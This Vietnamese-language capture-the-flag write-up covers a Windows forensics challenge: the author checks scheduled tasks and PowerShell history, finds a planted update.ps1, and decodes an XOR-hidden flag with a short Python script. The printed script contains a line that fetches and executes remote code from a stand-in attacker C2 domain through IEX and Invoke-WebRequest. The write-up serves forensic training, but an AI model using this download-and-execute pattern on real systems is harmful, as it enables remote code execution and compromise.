# UofTCTF2024_No-grep

> Use the VM from `Hourglass` to find the 2nd flag on the system !

- Tiếp tục sử dụng máy ảo được cung cấp trong challenge `UofTCTF2024_Hourglass` ta thấy có hai entry trong `Task Scheduler` thực thi câu lệnh qua powershell.

- Hai entry này tương ứng với Server và Client và đều thực thi chung 1 file.ps1 chỉ khác là sử dụng đối số tương ứng với hai Scenario khác nhau.

```ps1
C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Unrestricted -NonInteractive -NoProfile -WindowStyle Hidden "& %windir%\system32\WindowsPowerShell\v1.0\Modules\SmbShare\DisableUnusedSmb1.ps1 -Scenario Client"

C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Unrestricted -NonInteractive -NoProfile -WindowStyle Hidden "& %windir%\system32\WindowsPowerShell\v1.0\Modules\SmbShare\DisableUnusedSmb1.ps1 -Scenario Server"
```

- Nội dung file `%windir%\system32\WindowsPowerShell\v1.0\Modules\SmbShare\DisableUnusedSmb1.ps1`:

```
# Copyright (c) 2017 Microsoft Corporation. All rights reserved.
#
# This script is used to automatically removes support for the legacy SMB 1.0/CIFS protocol when such support isn�t actively needed during normal system usage..
Param
(
    [Parameter(Mandatory=$True)]
    [ValidateSet("Client", "Server")]
    [string]
    $Scenario
)

#
# ------------------
# FUNCTIONS - START
# ------------------
#
Function UninstallSmb1 ($FeatureNames)
{
  try
    {
       Remove-SMBComponent -Name $FeatureNames
    }
    catch {}
}

#
# ------------------
# FUNCTIONS - END
# ------------------
#

#
# ------------------------
# SCRIPT MAIN BODY - START
# ------------------------
#

$ScenarioData = @{
    "Client" = @{
        "FeatureName" = "SMB1Protocol-Client";
        "ServiceName" = "LanmanWorkstation"
    };
    "Server" = @{
        "FeatureName" = "SMB1Protocol-Server";
        "ServiceName" = "LanmanServer"
    }
}

$FeaturesToRemove = @()

foreach ($key in $ScenarioData.Keys)
{
    $FeatureName = $ScenarioData[$key].FeatureName
    $ServiceName = $ScenarioData[$key].ServiceName

    $ScenarioData[$key].FeatureState = (Get-WindowsOptionalFeature -Online -FeatureName $FeatureName).State
    $ScenarioData[$key].ServiceParameters = Get-ItemProperty "HKLM:\System\CurrentControlSet\Services\${ServiceName}\Parameters"
}

$FeaturesToRemove += $ScenarioData[$Scenario].FeatureName
$ScenarioData[$Scenario].FeatureState = "Disabled"

$RemoveDeprecationTasks = $true

foreach ($key in $ScenarioData.Keys)
{
    if($ScenarioData[$key].FeatureState -ne "Disabled" -and
       $ScenarioData[$key].ServiceParameters.AuditSmb1Access -ne 0) {

        $RemoveDeprecationTasks = $false
    }
}

if ($RemoveDeprecationTasks) {
    $FeaturesToRemove += "SMB1Protocol-Deprecation"

    $RemoveToplevelFeature = $true

    foreach ($key in $ScenarioData.Keys)
    {
        if($ScenarioData[$key].FeatureState -ne "Disabled") {
            $RemoveToplevelFeature = $false
        }
    }

    if ($RemoveToplevelFeature) {
        $FeaturesToRemove += "SMB1Protocol"
    }
}

UninstallSmb1 -FeatureName $FeaturesToRemove

$NewFeatureState = (Get-WindowsOptionalFeature -Online -FeatureName $ScenarioData[$Scenario].FeatureName).State

if ($NewFeatureState -ne "Enabled")
{
    $ServiceName = $ScenarioData[$Scenario].ServiceName
    $RegistryPath = "HKLM:\System\CurrentControlSet\Services\${ServiceName}\Parameters"
    New-ItemProperty -Path $RegistryPath -Name AuditSmb1Access -Value 0 -PropertyType DWORD -Force | Out-Null
}
```

- Script trên chủ yếu thực thi nhằm vô hiệu hóa SMB 1.0 vì lý do bảo mật, do SMB 1.0 được coi là một giao thức cổ điển với các lỗ hổng bảo mật đã biết nhưng đến đây thì lại không có hướng đi nào tiếp.

- Mình thử check lại history của tất cả các user khi sử dụng powershell để tìm kiếm gì đó thì phát hiện có một file ps1 lạ cũng được sử dụng.

```ps1
get-content C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

- Trong lịch sử của powershell có 1 lệnh khả nghi `Set-Alias -Name UpdateSystem -Value "C:\Windows\Web\Wallpaper\Theme2\update.ps1"` và khi tìm file `update.ps1` thì thấy có nội dung file như sau:

```ps1

$String_Key = 'W0wMadeitthisfar'

$NewValue = '$(' + (([int[]][char[]]$String | ForEach-Object { "[char]$($_)" }) -join '+') + ')'

$chars = 34, 95, 17, 57, 2, 16, 3, 18, 68, 16, 12, 54, 4, 82, 24, 45, 35, 0, 40, 63, 20, 10, 58, 25, 3, 65, 0, 20

$keyAscii = $String_Key.ToCharArray() | ForEach-Object { [int][char]$_ }

$resultArray = $chars -bxor $keyAscii

IEX (Invoke-WebRequest -Uri 'https://somec2attackerdomain.com/chrome.exe' -UseBasicParsing).Content

```

- Nội dung của script tập trung vào việc XOR `$keyAscii` (định dạng CharArray được convert từ `$String_Key`) với `$chars`, vì vậy mình viết script python đơn giản để thực hiện việc này.

```python
x="34 95 17 57 2 16 3 18 68 16 12 54 4 82 24 45 35 0 40 63 20 10 58 25 3 65 0 20".split(' ')
y="87 48 119 77 97 100 101 105 116 116 104 105 115 102 97 114".split(' ')

flag=""
c=0
for n in range(len(x)):
    if c > len(y)-1:
        c=0
    flag+=chr(int(x[n])^int(y[c]))
    c+=1
print(flag)
```

- Ta thu được flag `uoftctf{0dd_w4y_t0_run_pw5h}`.
